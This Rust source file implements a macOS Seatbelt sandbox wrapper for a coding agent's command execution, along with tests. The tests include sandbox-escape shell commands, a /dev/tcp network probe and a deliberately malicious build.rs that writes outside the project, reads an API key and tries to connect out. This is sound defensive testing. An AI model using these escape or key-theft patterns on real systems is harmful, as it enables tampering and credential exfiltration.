//! Seatbelt 沙箱 Runtime：装饰器，包装任意 [`Runtime`]（`LocalRuntime` /
//! `NixRuntime`），把 `exec` 的衍生进程放进 macOS Seatbelt 沙箱
//! （`/usr/bin/sandbox-exec`）。
//!
//! 威胁模型见 docs/sandbox-design.md：exec 允许运行 cargo，而 cargo 会衍生
//! 出不受我们控制的代码（`build.rs` / proc-macro / 测试二进制）。Sandbox 在
//! OS 层强制约束这些衍生进程的写路径与网络：
//!
//! ```text
//! exec → /usr/bin/sandbox-exec -p <policy> <program> <args...>
//! ```
//!
//! - 文件操作（`read_file` / `write_file` / `read_dir`）**不经沙箱**，直接
//!   委托内层 runtime（Agent 自身的文件工具已有 `resolve_within` 边界 +
//!   Capabilities 门；沙箱约束的是 cargo / build.rs 这类衍生进程）。
//! - 与 `Capabilities`（`MYAGENT_READ_ONLY`）正交可组合，与 `MYAGENT_RUNTIME`
//!   （local / nix）正交可组合（NixRuntime 在内层时，`sandbox-exec` 包裹
//!   `nix develop --command ...`，策略对整个进程树生效）。
//! - 构造时验证 macOS + `/usr/bin/sandbox-exec` 存在，否则返回清晰 `io::Error`，
//!   绝不静默降级为不隔离。
//!
//! SBPL 语义注意：规则"后匹配者生效"，必须 **deny 在前、allow 在后**；
//! 且 `sandbox-exec` 会解析操作路径（跟随 `/var`、`/tmp` 等 symlink）但
//! **按字面匹配策略里的 subpath**，因此 ROOT / TMPDIR 必须 canonicalize
//! 后注入（否则 `/var/folders/...` 下的合法写入会被误拒）。

use std::io;
use std::path::{Path, PathBuf};

use crate::runtime::{ExecError, ExecOutput, Runtime, RuntimeEntry, run_command};

/// Seatbelt 沙箱可执行文件路径（macOS 自带，随系统发布）。
pub const SANDBOX_EXEC: &str = "/usr/bin/sandbox-exec";

/// Seatbelt 沙箱 Runtime 装饰器。
///
/// 持有内层 [`Runtime`]（文件操作委托）与策略参数（canonicalize 后的
/// ROOT / TMPDIR、网络开关），`exec` 包装为
/// `sandbox-exec -p <policy> <program> <args...>`。
pub struct SandboxedRuntime {
    /// 内层 Runtime（`LocalRuntime` / `NixRuntime`），文件操作直接委托。
    inner: Box<dyn Runtime>,
    /// canonicalize 后的 agent root（写入策略的 `<ROOT>`）。
    root: PathBuf,
    /// canonicalize 后的临时目录（写入策略的 `<TMPDIR>`）。
    tmpdir: PathBuf,
    /// 是否在沙箱内放开网络（`MYAGENT_SANDBOX_NETWORK=1/true`）。
    network: bool,
}

impl SandboxedRuntime {
    /// 构造并验证沙箱可用。
    ///
    /// 非 macOS 或 `/usr/bin/sandbox-exec` 不存在时返回 `io::Error`
    /// （构造失败、调用方清晰报错并退出，**绝不静默降级为不隔离**）。
    ///
    /// `root` 为 agent root（当前工作目录）；`network` 为网络开关；
    /// `inner` 为被包装的 runtime（local / nix 选择之后）。
    pub fn new(root: &Path, network: bool, inner: Box<dyn Runtime>) -> io::Result<Self> {
        if !cfg!(target_os = "macos") {
            return Err(io::Error::other(
                "Seatbelt sandbox requires macOS (sandbox-exec is not available on this platform)",
            ));
        }
        if !Path::new(SANDBOX_EXEC).exists() {
            return Err(io::Error::new(
                io::ErrorKind::NotFound,
                format!(
                    "{SANDBOX_EXEC} not found; Seatbelt sandbox is not available on this system"
                ),
            ));
        }
        Ok(Self::from_parts(root, resolve_tmpdir(), network, inner))
    }

    /// 用显式 root / tmpdir 构造（探测与 env 解析由调用方决定；测试注入用）。
    fn from_parts(root: &Path, tmpdir: PathBuf, network: bool, inner: Box<dyn Runtime>) -> Self {
        Self {
            inner,
            root: canonicalize_or(root),
            tmpdir: canonicalize_or(&tmpdir),
            network,
        }
    }

    /// 测试构造器：跳过 `new` 的 macOS / sandbox-exec 探测与 env 解析，
    /// 直接指定 root / tmpdir / network（与 `NixRuntime` 测试直接构造一致）。
    #[cfg(test)]
    fn for_test(root: &Path, tmpdir: &Path, network: bool, inner: Box<dyn Runtime>) -> Self {
        Self::from_parts(root, tmpdir.to_path_buf(), network, inner)
    }
}

impl Runtime for SandboxedRuntime {
    fn read_file(&self, path: &Path) -> io::Result<String> {
        self.inner.read_file(path)
    }

    fn write_file(&self, path: &Path, content: &str) -> io::Result<()> {
        self.inner.write_file(path, content)
    }

    fn read_dir(&self, path: &Path) -> io::Result<Vec<RuntimeEntry>> {
        self.inner.read_dir(path)
    }

    fn exec(&self, program: &str, args: &[String], cwd: &Path) -> Result<ExecOutput, ExecError> {
        let argv = sandbox_argv(program, args, &self.root, &self.tmpdir, self.network);
        run_command(&argv[0], &argv[1..], cwd)
    }
}

/// 构造 SBPL 策略字符串。
///
/// 纯函数（无 IO、不依赖 sandbox-exec），便于任何平台单测。
/// SBPL 是"后匹配者生效"，因此 **deny 在前、allow 在后**：
/// 先全禁网络与写入，再仅放开 `<ROOT>` 与 `<TMPDIR>` 两个 subpath。
/// `network=false` 时包含 `(deny network*)`；`network=true` 时不包含。
///
/// 注意：调用方传入的 `root` / `tmpdir` 应为 **canonicalize 后**的路径
/// （`sandbox-exec` 按字面匹配 subpath，但会解析操作路径的 symlink）。
pub fn sandbox_policy(root: &Path, tmpdir: &Path, network: bool) -> String {
    let mut policy = String::from("(version 1)\n(allow default)\n");
    if !network {
        policy.push_str("(deny network*)\n");
    }
    policy.push_str("(deny file-write*)\n");
    policy.push_str(&format!(
        "(allow file-write* (subpath \"{}\"))\n",
        sbpl_escape(&root.display().to_string())
    ));
    policy.push_str(&format!(
        "(allow file-write* (subpath \"{}\"))",
        sbpl_escape(&tmpdir.display().to_string())
    ));
    policy
}

/// 构造 `sandbox-exec -p <policy> <program> <args...>` 的 argv。
///
/// 纯函数，便于在无 sandbox-exec 环境下做单元测试。
pub fn sandbox_argv(
    program: &str,
    args: &[String],
    root: &Path,
    tmpdir: &Path,
    network: bool,
) -> Vec<String> {
    let mut argv = Vec::with_capacity(3 + args.len());
    argv.push(SANDBOX_EXEC.to_string());
    argv.push("-p".to_string());
    argv.push(sandbox_policy(root, tmpdir, network));
    argv.push(program.to_string());
    argv.extend(args.iter().cloned());
    argv
}

/// 解析沙箱内允许写入的临时目录：`TMPDIR` 环境变量，缺失回退 `/tmp`。
///
/// 返回 canonicalize 后的路径（macOS 的 `/var/folders/...` 是指向
/// `/private/var/...` 的 symlink，不 canonicalize 会导致 rustc 临时写入
/// 被误拒）；canonicalize 失败时回退用原始路径。
fn resolve_tmpdir() -> PathBuf {
    let tmp = std::env::var_os("TMPDIR")
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from("/tmp"));
    canonicalize_or(&tmp)
}

/// canonicalize 路径；失败（如路径不存在）时回退原始路径。
fn canonicalize_or(path: &Path) -> PathBuf {
    path.canonicalize()
        .unwrap_or_else(|_| path.to_path_buf())
}

/// 转义 SBPL 字符串字面量中的 `\` 与 `"`。
fn sbpl_escape(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::runtime::LocalRuntime;
    use std::fs;
    use std::sync::atomic::{AtomicUsize, Ordering};

    static COUNTER: AtomicUsize = AtomicUsize::new(0);

    /// 每个测试一个独立的临时目录，避免并行测试互相干扰。
    fn temp_root() -> PathBuf {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let dir =
            std::env::temp_dir().join(format!("myagent-sandbox-test-{}-{n}", std::process::id()));
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    /// 沙箱可用性门控：`/usr/bin/sandbox-exec` 存在，且实际试跑一次策略能
    /// 成功 apply。失败（如 Codex / 嵌套 Seatbelt 环境报 `sandbox_apply:
    /// Operation not permitted`）时测试 early-return 并打印提示——对齐
    /// nix 冒烟测试模式（存在但用不了时静默跳过，不用 `#[ignore]`）。
    fn sandbox_available() -> bool {
        if !Path::new(SANDBOX_EXEC).exists() {
            eprintln!("skipping: {SANDBOX_EXEC} not found");
            return false;
        }
        match std::process::Command::new(SANDBOX_EXEC)
            .args(["-p", "(version 1)(allow default)", "/usr/bin/true"])
            .status()
        {
            Ok(status) if status.success() => true,
            Ok(_) => {
                eprintln!(
                    "skipping: sandbox-exec could not apply policy (nested Seatbelt? \
                     sandbox_apply: Operation not permitted)"
                );
                false
            }
            Err(err) => {
                eprintln!("skipping: failed to run {SANDBOX_EXEC}: {err}");
                false
            }
        }
    }

    /// 在沙箱内跑一段 `/bin/sh` 脚本（测试直接经 Runtime::exec，绕过工具白名单）。
    fn run_sh(rt: &dyn Runtime, cwd: &Path, script: &str) -> ExecOutput {
        rt.exec("sh", &["-c".to_string(), script.to_string()], cwd)
            .unwrap()
    }

    // ---------------- 第一层：纯函数单测（任何平台） ----------------

    #[test]
    fn sandbox_argv_wraps_with_policy() {
        // 契约要求传入 canonicalize 后的路径（macOS temp_dir 的
        // /var/folders → /private/var symlink 由 canonicalize 解析）
        let c_root = temp_root().canonicalize().unwrap();
        let c_tmp = temp_root().canonicalize().unwrap();
        let argv = sandbox_argv(
            "cargo",
            &["check".to_string(), "--all".to_string()],
            &c_root,
            &c_tmp,
            false,
        );

        assert_eq!(argv.len(), 6);
        assert_eq!(argv[0], SANDBOX_EXEC);
        assert_eq!(argv[1], "-p");
        assert_eq!(argv[3], "cargo");
        assert_eq!(argv[4], "check");
        assert_eq!(argv[5], "--all");

        let policy = &argv[2];
        assert!(policy.starts_with("(version 1)"), "policy: {policy}");
        // 策略含 canonicalize 后的 ROOT / TMPDIR
        assert!(
            policy.contains(&c_root.display().to_string()),
            "policy should contain canonicalized root: {policy}"
        );
        assert!(
            policy.contains(&c_tmp.display().to_string()),
            "policy should contain canonicalized tmpdir: {policy}"
        );
        // deny 必须出现在 allow 之前（SBPL 后匹配者生效）
        assert!(policy.contains("(deny file-write*)"));
        assert!(policy.contains("(deny network*)"));
        let d_net = policy.find("(deny network*)").unwrap();
        let d_write = policy.find("(deny file-write*)").unwrap();
        let a_root = policy.find("(allow file-write*").unwrap();
        assert!(
            d_net < d_write && d_write < a_root,
            "deny must precede allow"
        );
    }

    #[test]
    fn sandbox_argv_without_args() {
        let root = temp_root();
        let tmp = temp_root();
        let argv = sandbox_argv("true", &[], &root, &tmp, false);
        assert_eq!(argv.len(), 4);
        assert_eq!(argv[3], "true");
    }

    #[test]
    fn network_deny_line_depends_on_flag() {
        let root = temp_root();
        let tmp = temp_root();

        let off = sandbox_policy(&root, &tmp, false);
        assert!(
            off.contains("(deny network*)"),
            "network=off must deny network"
        );

        let on = sandbox_policy(&root, &tmp, true);
        assert!(
            !on.contains("(deny network*)"),
            "network=on must not deny network: {on}"
        );
    }

    #[test]
    fn policy_escapes_backslash_and_quote() {
        // SBPL 字符串内的 \ 与 " 必须转义（纯字符串，无需真实路径存在）
        let weird = PathBuf::from("root\"with\\slash");
        let policy = sandbox_policy(&weird, &weird, false);
        assert!(
            policy.contains("(subpath \"root\\\"with\\\\slash\")"),
            "policy should contain escaped path: {policy}"
        );
        assert!(
            !policy.contains("root\"with\\slash"),
            "raw unescaped path leaked"
        );
    }

    #[test]
    fn sbpl_escape_escapes_special_characters() {
        assert_eq!(sbpl_escape("plain"), "plain");
        assert_eq!(sbpl_escape("a\"b\\c"), "a\\\"b\\\\c");
    }

    #[test]
    fn canonicalize_or_falls_back_on_missing_path() {
        let missing = temp_root().join("does-not-exist");
        assert_eq!(canonicalize_or(&missing), missing);
    }

    // ---------------- 第二层：攻击矩阵 + 网络探测（门控） ----------------

    /// §4.2 攻击矩阵：6 种写逃逸全部被拒；ROOT / TMPDIR 内的写入放行。
    #[test]
    fn attack_matrix_blocks_all_write_escapes() {
        if !sandbox_available() {
            return;
        }
        let base = temp_root();
        let root = base.join("root");
        let tmp = base.join("tmp");
        let outside = base.join("outside");
        for dir in [&root, &tmp, &outside] {
            fs::create_dir_all(dir).unwrap();
        }
        // canonicalize 后注入策略与脚本（sandbox-exec 按字面匹配 subpath）
        let c_root = root.canonicalize().unwrap();
        let c_tmp = tmp.canonicalize().unwrap();
        let c_out = outside.canonicalize().unwrap();
        let s_root = c_root.display().to_string();
        let s_tmp = c_tmp.display().to_string();
        let s_out = c_out.display().to_string();

        let rt = SandboxedRuntime::for_test(&c_root, &c_tmp, false, Box::new(LocalRuntime));

        // 控制组：ROOT / TMPDIR 内写入必须放行（策略不误伤）
        run_sh(
            &rt,
            &root,
            &format!("echo ok > {s_root}/in.txt && echo ok > {s_tmp}/t.txt"),
        );
        assert!(
            c_root.join("in.txt").exists(),
            "write into ROOT must be allowed"
        );
        assert!(
            c_tmp.join("t.txt").exists(),
            "write into TMPDIR must be allowed"
        );

        // 1. 绝对路径直写（ROOT 外）
        run_sh(&rt, &root, &format!("echo pwned > {s_out}/abs.txt"));
        assert!(
            !c_out.join("abs.txt").exists(),
            "attack 1 (absolute write) leaked"
        );

        // 2. symlink 逃逸写：ROOT 内建指向外部的 symlink 再经它写
        fs::write(c_out.join("victim.txt"), "secret").unwrap();
        run_sh(
            &rt,
            &root,
            &format!(
                "ln -s {s_out}/victim.txt {s_root}/link.txt && echo pwned > {s_root}/link.txt"
            ),
        );
        assert_eq!(
            fs::read_to_string(c_out.join("victim.txt")).unwrap(),
            "secret",
            "attack 2 (symlink escape) modified victim"
        );

        // 3. rename 跨界：ROOT 内文件移动到 ROOT 外
        run_sh(
            &rt,
            &root,
            &format!("echo x > {s_root}/x.txt && mv {s_root}/x.txt {s_out}/x.txt"),
        );
        assert!(
            !c_out.join("x.txt").exists(),
            "attack 3 (rename escape) leaked"
        );
        assert!(
            c_root.join("x.txt").exists(),
            "renamed file must stay in ROOT"
        );

        // 4. unlink 外部：删除 ROOT 外文件
        fs::write(c_out.join("victim-u.txt"), "keep").unwrap();
        run_sh(&rt, &root, &format!("rm -f {s_out}/victim-u.txt"));
        assert!(
            c_out.join("victim-u.txt").exists(),
            "attack 4 (unlink outside) succeeded"
        );

        // 5. hardlink 映射：把外部文件 link 进 ROOT 再写
        fs::write(c_out.join("victim-h.txt"), "keep").unwrap();
        run_sh(
            &rt,
            &root,
            &format!("ln {s_out}/victim-h.txt {s_root}/hl.txt && echo pwned > {s_root}/hl.txt"),
        );
        assert_eq!(
            fs::read_to_string(c_out.join("victim-h.txt")).unwrap(),
            "keep",
            "attack 5 (hardlink mapping) modified victim"
        );

        // 6. `..` 逃逸写：ROOT 子目录内经 .. 跳出
        run_sh(
            &rt,
            &root,
            &format!("mkdir -p {s_root}/sub && echo pwned > {s_root}/sub/../../outside/dotdot.txt"),
        );
        assert!(
            !c_out.join("dotdot.txt").exists(),
            "attack 6 (dotdot escape) leaked"
        );

        fs::remove_dir_all(&base).unwrap();
    }

    /// 网络边界：默认（network=off）连必然可达的 1.1.1.1:80 被拒；
    /// `network=true` opt-in 后放行（用可达地址区分"被沙箱拒"与"对端无服务"）。
    #[test]
    fn network_denied_by_default_and_opt_in_connects() {
        if !sandbox_available() {
            return;
        }
        let base = temp_root();
        let root = base.join("root");
        let tmp = base.join("tmp");
        fs::create_dir_all(&root).unwrap();
        fs::create_dir_all(&tmp).unwrap();

        // 用 bash /dev/tcp（macOS 自带），避免依赖 nc；1.1.1.1:80 必然可达
        let probe = "bash -c 'echo > /dev/tcp/1.1.1.1/80'".to_string();

        let rt_off = SandboxedRuntime::for_test(&root, &tmp, false, Box::new(LocalRuntime));
        let out = run_sh(&rt_off, &root, &probe);
        assert_ne!(
            out.code, 0,
            "network must be denied by default; output: {}",
            out.output
        );

        let rt_on = SandboxedRuntime::for_test(&root, &tmp, true, Box::new(LocalRuntime));
        let out = run_sh(&rt_on, &root, &probe);
        assert_eq!(
            out.code, 0,
            "network must work when opted in (MYAGENT_SANDBOX_NETWORK=1); output: {}",
            out.output
        );

        fs::remove_dir_all(&base).unwrap();
    }

    // ---------------- 第三层：恶意 build.rs 集成测试（门控） ----------------

    /// 恶意 build.rs 源码：尝试 (a) 写 $HOME、(b) symlink 逃逸写、
    /// (c) rename/unlink 到项目外、(d) TcpStream 外联、(e) 读 OPENAI_API_KEY
    /// 并尝试外传。结果写入项目内的 net_status.txt（ROOT 内允许写，
    /// 供测试断言网络与密钥外传状态）。
    const MALICIOUS_BUILD_RS: &str = r#"
use std::fs;
use std::net::TcpStream;
use std::os::unix::fs::symlink;
use std::path::PathBuf;

fn main() {
    let home = std::env::var("HOME").unwrap_or_default();
    let root = std::env::var("CARGO_MANIFEST_DIR").unwrap_or_default();
    let out_dir = std::env::var("OUT_DIR").unwrap_or_default();
    let home_p = PathBuf::from(&home);
    let root_p = PathBuf::from(&root);

    // (a) 绝对路径直写 $HOME
    fs::write(home_p.join("pwned-a.txt"), "pwned").ok();

    // (b) symlink 逃逸后写
    let link = root_p.join("escape-link.txt");
    let b_target = home_p.join("pwned-b.txt");
    symlink(&b_target, &link).ok();
    fs::write(&link, "pwned").ok();

    // (c) rename / unlink 到项目外
    let moved = root_p.join("moved.txt");
    fs::write(&moved, "x").ok();
    fs::rename(&moved, home_p.join("pwned-c.txt")).ok();
    fs::remove_file(home_p.join("victim-c.txt")).ok();

    // (d) 外联 + (e) 读 key 并尝试外传
    let net = TcpStream::connect("1.1.1.1:80").is_ok();
    let key = std::env::var("OPENAI_API_KEY").unwrap_or_default();
    let exfil = !key.is_empty() && TcpStream::connect("1.1.1.1:80").is_ok();

    fs::write(
        root_p.join("net_status.txt"),
        format!("NET={net}\nKEY_LEN={}\nEXFIL={exfil}\n", key.len()),
    )
    .unwrap();

    // 无害部分：只写 OUT_DIR
    fs::write(PathBuf::from(&out_dir).join("marker.txt"), "ok").unwrap();
}
"#;

    /// 无害 build.rs：只写 OUT_DIR（对照组，证明策略不过严）。
    const HARMLESS_BUILD_RS: &str = r#"
use std::path::PathBuf;
fn main() {
    let out_dir = std::env::var("OUT_DIR").unwrap();
    std::fs::write(PathBuf::from(&out_dir).join("marker.txt"), "ok").unwrap();
    println!("cargo:rerun-if-changed=build.rs");
}
"#;

    /// 生成一个零外部依赖的 cargo 项目脚手架（纯 std，离线可构建）。
    fn write_probe_project(dir: &Path, package: &str, build_rs: &str) {
        fs::create_dir_all(dir.join("src")).unwrap();
        fs::create_dir_all(dir.join("tmp")).unwrap();
        fs::write(
            dir.join("Cargo.toml"),
            format!("[package]\nname = \"{package}\"\nversion = \"0.1.0\"\nedition = \"2021\"\n"),
        )
        .unwrap();
        fs::write(dir.join("src/main.rs"), "fn main() {}\n").unwrap();
        fs::write(dir.join("build.rs"), build_rs).unwrap();
    }

    /// 经 `rt` 跑 `cargo build --offline`：用 `sh -c 'HOME=... TMPDIR=...
    /// OPENAI_API_KEY=sekret cargo build'` 包裹，把 HOME 指到临时目录
    /// （保护真实 $HOME），TMPDIR 指到项目内 tmp（策略允许写），注入一个
    /// 测试 key 证明环境变量被 build.rs 继承。
    fn cargo_build(rt: &dyn Runtime, project: &Path, home: &Path) -> Result<ExecOutput, ExecError> {
        let script = format!(
            "cd '{}' && HOME='{}' TMPDIR='{}' OPENAI_API_KEY=sekret cargo build --offline",
            project.display(),
            home.display(),
            project.join("tmp").display()
        );
        rt.exec("sh", &["-c".to_string(), script], project)
    }

    /// 恶意 build.rs 在沙箱内：越界写全部被拒、外联失败、key 可读但无法外传；
    /// `network=true` opt-in 后外联成功。对照组（无害 build.rs）构建必须成功。
    #[test]
    fn malicious_build_rs_is_confined_and_harmless_control_succeeds() {
        if !sandbox_available() {
            return;
        }
        let base = temp_root();

        // ---- 恶意项目：ROOT=project，伪造 HOME 为 base/home（策略外）----
        let project = base.join("project");
        let home = base.join("home");
        fs::create_dir_all(&home).unwrap();
        fs::write(home.join("victim-c.txt"), "untouched").unwrap();
        write_probe_project(&project, "myagent_malicious_probe", MALICIOUS_BUILD_RS);

        // 注入的 TMPDIR = 项目内 tmp（允许写）；伪造 HOME 在 base 下，
        // 不落在 ROOT 或注入 TMPDIR 内 → 沙箱内写被拒。
        let tmp = project.join("tmp");
        let rt_off = SandboxedRuntime::for_test(&project, &tmp, false, Box::new(LocalRuntime));

        let out = cargo_build(&rt_off, &project, &home);
        let out = out.expect("cargo build should run to completion");
        let status = fs::read_to_string(project.join("net_status.txt"))
            .unwrap_or_else(|_| panic!("net_status.txt missing; build output:\n{}", out.output));

        // (d)(e) 网络默认关：外联失败；key 已继承（KEY_LEN=6）但 EXFIL=false
        assert!(
            status.contains("NET=false"),
            "expected NET=false, got: {status}"
        );
        assert!(
            status.contains("KEY_LEN=6"),
            "env key must be inherited, got: {status}"
        );
        assert!(
            status.contains("EXFIL=false"),
            "expected EXFIL=false, got: {status}"
        );

        // (a)(b)(c) 项目外攻击产物全部不存在/未被修改
        for name in ["pwned-a.txt", "pwned-b.txt", "pwned-c.txt", "moved.txt"] {
            assert!(
                !home.join(name).exists(),
                "malicious artifact {name} must not exist in fake HOME"
            );
        }
        assert_eq!(
            fs::read_to_string(home.join("victim-c.txt")).unwrap(),
            "untouched",
            "unlink of outside victim must be blocked"
        );
        // rename 跨界被拒：moved.txt 应留在 ROOT 内
        assert!(
            project.join("moved.txt").exists(),
            "renamed file must stay in ROOT"
        );

        // ---- 网络 opt-in：重写 build.rs 强制重跑，外联必须成功 ----
        fs::write(project.join("build.rs"), MALICIOUS_BUILD_RS).unwrap();
        let rt_on = SandboxedRuntime::for_test(&project, &tmp, true, Box::new(LocalRuntime));
        let out = cargo_build(&rt_on, &project, &home)
            .expect("cargo build (network on) should run to completion");
        let status = fs::read_to_string(project.join("net_status.txt")).unwrap_or_else(|_| {
            panic!(
                "net_status.txt missing after network-on build; output:\n{}",
                out.output
            )
        });
        assert!(
            status.contains("NET=true"),
            "expected NET=true, got: {status}"
        );
        assert!(
            status.contains("KEY_LEN=6"),
            "env key must be inherited, got: {status}"
        );
        assert!(
            status.contains("EXFIL=true"),
            "expected EXFIL=true, got: {status}"
        );

        // ---- 对照组：无害 build.rs 在沙箱内构建必须成功（策略不过严）----
        let control = base.join("control");
        write_probe_project(&control, "myagent_control_probe", HARMLESS_BUILD_RS);
        let rt_ctrl = SandboxedRuntime::for_test(
            &control,
            &control.join("tmp"),
            false,
            Box::new(LocalRuntime),
        );
        let out = cargo_build(&rt_ctrl, &control, &base.join("control-home"))
            .expect("harmless control build must run");
        assert_eq!(
            out.code, 0,
            "harmless build.rs must succeed in sandbox; output:\n{}",
            out.output
        );
        // OUT_DIR 内的 marker 已写入（证明无害写入路径畅通）
        let marker = find_marker(&control.join("target/debug/build"));
        assert!(marker.is_some(), "harmless build must write OUT_DIR marker");

        fs::remove_dir_all(&base).unwrap();
    }

    /// 递归查找 `marker.txt`（无害对照组证明 OUT_DIR 写入成功）。
    fn find_marker(dir: &Path) -> Option<PathBuf> {
        if !dir.is_dir() {
            return None;
        }
        for entry in fs::read_dir(dir).ok()?.flatten() {
            let path = entry.path();
            if path.is_dir() {
                if let Some(found) = find_marker(&path) {
                    return Some(found);
                }
            } else if path
                .file_name()
                .map(|n| n == "marker.txt")
                .unwrap_or(false)
            {
                return Some(path);
            }
        }
        None
    }
}
